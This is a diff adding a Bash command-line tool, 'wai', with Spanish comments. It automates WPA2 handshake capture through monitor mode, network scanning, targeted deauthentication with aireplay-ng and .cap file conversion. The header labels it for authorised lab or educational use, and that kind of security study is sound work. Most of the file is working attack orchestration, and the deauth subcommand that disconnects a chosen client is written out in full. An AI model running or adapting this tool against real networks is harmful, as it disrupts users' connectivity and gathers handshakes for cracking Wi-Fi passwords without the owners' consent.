@@ -1,0 +1,202 @@
+#!/usr/bin/env bash
+# ╔══════════════════════════════════════════════════════════════════════════════╗
+# ║  wai  ·  WPA2 Handshake Capture CLI                                        ║
+# ║  Uso: sudo wai <cap|scan|mon|deth|opt> [flags]                              ║
+# ║  SOLO PARA REDES PROPIAS O AUTORIZADAS — USO EDUCATIVO / LAB                ║
+# ╚══════════════════════════════════════════════════════════════════════════════╝
+
+# Forzar bash aunque se invoque desde zsh
+if [ -z "$BASH_VERSION" ]; then
+    exec bash "$0" "$@"
+fi
+
+set -Eeuo pipefail
+
+WAI_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+LIB_DIR="${WAI_DIR}/lib"
+
+# ── Cargar módulos en orden ────────────────────────────────────────────────────
+source "${LIB_DIR}/constants.sh"
+source "${LIB_DIR}/logging.sh"
+source "${LIB_DIR}/state.sh"
+source "${LIB_DIR}/cleanup.sh"
+source "${LIB_DIR}/args.sh"
+source "${LIB_DIR}/meta.sh"
+source "${LIB_DIR}/preflight.sh"
+source "${LIB_DIR}/iwd.sh"
+source "${LIB_DIR}/monitor.sh"
+source "${LIB_DIR}/scan.sh"
+source "${LIB_DIR}/clients.sh"
+source "${LIB_DIR}/deauth.sh"
+source "${LIB_DIR}/capture.sh"
+source "${LIB_DIR}/output.sh"
+
+# ── Dispatch de subcomandos ────────────────────────────────────────────────────
+main() {
+    local sub="${1:-}"
+    shift || true
+
+    case "$sub" in
+        cap)   cmd_cap "$@" ;;
+        scan)  cmd_scan "$@" ;;
+        mon)   cmd_mon "$@" ;;
+        deth)  cmd_deth "$@" ;;
+        opt)   cmd_opt "$@" ;;
+        -h|--help|help|"") usage ;;
+        *)     die "Subcomando desconocido: '${sub}'  (usa -h para ayuda)" ;;
+    esac
+}
+
+# ── Subcomando: cap — flujo completo de captura ────────────────────────────────
+cmd_cap() {
+    parse_cap_args "$@"
+    banner "cap"
+
+    preflight
+    install_trap
+    save_and_stop_iwd
+    start_monitor
+
+    local total_targets=${#TARGETS_RAW[@]}
+    echo -e "\n${B}${C}  Targets en esta sesión: ${total_targets}${N}" >&2
+    for t in "${TARGETS_RAW[@]}"; do echo -e "    ${DIM}→ ${t}${N}" >&2; done
+    echo "" >&2
+
+    local target_idx=0
+    for raw_target in "${TARGETS_RAW[@]}"; do
+        target_idx=$(( target_idx + 1 ))
+        echo -e "\n${B}${C}════════════════════════════════════════════════════════════════════${N}" >&2
+        echo -e "${B}${C}  TARGET ${target_idx}/${total_targets}: ${raw_target}${N}" >&2
+        echo -e "${B}${C}════════════════════════════════════════════════════════════════════${N}\n" >&2
+
+        _reset_target_state
+        TARGET="$raw_target"
+
+        hdr "Caché de red"
+        init_meta
+        if load_meta; then
+            (( META_LOADED == 1 )) \
+                && ok  "Datos frescos — escaneo omitido." \
+                || warn "Caché expirada — se usará con verificación ante fallos."
+        else
+            info "Sin caché para '${TARGET}' — escaneo completo."
+        fi
+
+        resolve_target
+        if capture; then
+            optimize
+        else
+            warn "Target ${raw_target}: captura finalizada sin handshake."
+            _record_target_failure
+        fi
+    done
+
+    summary
+}
+
+# ── Subcomando: scan — solo listar redes ───────────────────────────────────────
+cmd_scan() {
+    parse_scan_args "$@"
+    banner "scan"
+    preflight
+    install_trap
+    save_and_stop_iwd
+    start_monitor
+    run_scan "$SCAN_SEC"
+    ok "Escaneo finalizado. CSV en ${TMP}/scan-01.csv"
+    cleanup
+}
+
+# ── Subcomando: mon — modo monitor on/off aislado ──────────────────────────────
+cmd_mon() {
+    parse_mon_args "$@"
+    banner "mon"
+    case "$MON_ACTION" in
+        on)
+            preflight
+            install_trap
+            save_and_stop_iwd
+            start_monitor
+            ok "Modo monitor activo: ${MON}"
+            info "Ejecuta 'wai mon off' o Ctrl+C para restaurar el sistema."
+            info "Saliendo sin desactivar — la interfaz queda en modo monitor."
+            trap - EXIT INT TERM
+            ;;
+        off)
+            install_trap
+            hdr "Deteniendo modo monitor"
+            pkill -9 -f "airodump-ng|aireplay-ng" 2>/dev/null || true
+            sleep 1
+            local candidate="${IFACE}mon"
+            if iw dev 2>/dev/null | awk '/Interface/{i=$2} /type monitor/{print i}' | grep -q .; then
+                candidate=$(iw dev 2>/dev/null | awk '/Interface/{i=$2} /type monitor/{print i}' | head -1)
+            fi
+            MON="$candidate"
+            airmon-ng stop "$MON" 2>&1 \
+                | while IFS= read -r l; do dbg "  $l"; done || true
+            ok "Modo monitor detenido: ${MON}"
+            cleanup
+            ;;
+    esac
+}
+
+# ── Subcomando: deth — deauth dirigido a un cliente (lab) ──────────────────────
+cmd_deth() {
+    parse_deth_args "$@"
+    banner "deth"
+    preflight
+    install_trap
+    save_and_stop_iwd
+    start_monitor
+
+    TARGET="${BSSID^^}"
+    SSID_NAME="$TARGET"
+    hdr "Deauth dirigido — BSSID=${TARGET}  Cliente=${CLIENT_MAC}  Canal=${CHANNEL:-auto}"
+
+    if [[ -z "$CHANNEL" ]]; then
+        info "Canal no especificado — escaneando para resolverlo..."
+        run_scan "$SCAN_SEC"
+        CHANNEL=$(awk -F',' -v b="${TARGET}" '
+            /^[0-9A-Fa-f]{2}:/ {
+                gsub(/ /,"",$1); gsub(/ /,"",$4)
+                if (toupper($1)==b) { print $4; exit }
+            }' "${TMP}/scan-01.csv")
+        [[ -z "$CHANNEL" ]] && die "Canal no encontrado para ${TARGET}. Usa -c <canal>."
+        ok "Canal resuelto: ${CHANNEL}"
+    fi
+
+    local log="${TMP}/deth.log"
+    info "Enviando ${DEAUTH_N} paquetes deauth a ${CLIENT_MAC} vía ${MON}..."
+    aireplay-ng \
+        --deauth "$DEAUTH_N" \
+        -a "$TARGET" \
+        -c "$CLIENT_MAC" \
+        "$MON" > "$log" 2>&1 \
+        && ok "Deauth enviado." \
+        || warn "aireplay-ng falló. Log:"
+    while IFS= read -r l; do dbg "  $l"; done < "$log" || true
+    cleanup
+}
+
+# ── Subcomando: opt — convertir .cap existentes ────────────────────────────────
+cmd_opt() {
+    parse_opt_args "$@"
+    banner "opt"
+    [[ ${#OPT_FILES[@]} -eq 0 ]] && die "Uso: wai opt -o <dir-salida> <archivo.cap>..."
+
+    for src in "${OPT_FILES[@]}"; do
+        [[ -f "$src" ]] || die "Archivo no encontrado: ${src}"
+        hdr "Optimizando $(basename "$src")"
+        CAP_FILE="$src"
+        _build_basename >/dev/null 2>&1 || true
+        TARGET="${TARGET:-$(basename "$src" .cap)}"
+        SSID_NAME="${SSID_NAME:-$TARGET}"
+        CHANNEL="${CHANNEL:-0}"
+        IFACE="${IFACE:-unknown}"
+        MON="${MON:-unknown}"
+        optimize
+    done
+    summary
+}
+
+main "$@"
